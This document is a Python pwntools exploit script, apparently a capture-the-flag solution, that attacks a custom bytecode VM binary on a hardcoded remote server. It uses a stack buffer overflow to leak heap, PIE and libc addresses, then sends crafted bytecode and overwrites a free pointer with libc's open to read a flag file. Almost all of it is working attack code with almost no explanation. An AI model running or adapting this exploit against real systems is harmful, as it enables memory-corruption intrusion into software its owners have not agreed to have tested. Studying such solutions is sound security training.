#!/usr/bin/env python3
from pwn import *

####Utils
def sendname(name):
	io.sendafter("is your name:",name)

def say(data):
	io.sendafter("say:",data)

"""
|============================================================================|
| VM stack bufferoverflow, execution of arbitrary byte code. ORW to get flag.|
|============================================================================|
"""

####Addr
pie_offset_leak = 0x203851
input_offset = 0x2d68
free_offset = 0x2038f8
__libc_free = 0x84540
open = 0xf70f0

####Exploit
#io = process(["./V"])
io = remote("207.246.82.76",8666)
sendname(b"A"*0xee+b"BB")
io.recvuntil("BB")
heap_base = u64(io.recvn(6)+b"\x00\x00")-0x50
print(f"Heap base: {hex(heap_base)}")
say("A"*0x100+"C")
sendname(b"A"*0xfe+b"BB")
io.recvuntil("BB")
pie_leak = u64(io.recvn(6)+b"\x00\x00")
pie_base = pie_leak-pie_offset_leak
print(f"Pie base: {hex(pie_base)}")
say(b"A".ljust(0x100,b"\x00")+b"C")
sendname(b"A"*0x100+p64(heap_base+input_offset))
bytecode = b"\x11"+p64(pie_base+free_offset)
bytecode += b"\x8f\x02"
bytecode += b"\x11"+p64(pie_base+0x203843)
bytecode += b"\x7f"
say(bytecode.ljust(0x100,b"\x00"))
io.recvline()
libc_leak = u64(io.recvline().strip()+b"\x00\x00")
libc_base = libc_leak-__libc_free
print(f"Libc base: {hex(libc_base)}")
sendname(b"A"*0x100+p64(heap_base+input_offset))
bytecode2 = b"\x11"+p64(pie_base+free_offset)
bytecode2 += b"\x67\x00"
say(bytecode.ljust(0x100,b"\x00")+p64(pie_base+0x203843))
sendname(b"A"*0x100+p64(heap_base+input_offset))
bytecode = b"\x12"+p64(pie_base+free_offset)
bytecode += b"\x13"+p64(0x100)
bytecode += b"\x11"+p64(0x0)
bytecode += b"\x8f\x00"
bytecode += b"\x11"+p64(pie_base+free_offset+0x8)
bytecode += b"\x12"+p64(0x0)
bytecode += b"\x8f\x03"
bytecode += b"\x12"+p64(pie_base+free_offset+0x10)
bytecode += b"\x11"+p64(0x3)
bytecode += b"\x13"+p64(0x50)
bytecode += b"\x8f\x00"
bytecode += b"\x11"+p64(pie_base+free_offset+0x10)
bytecode += b"\x8f\x02"
say(bytecode)
io.send(p64(libc_base+open)+b"flag")
io.interactive()
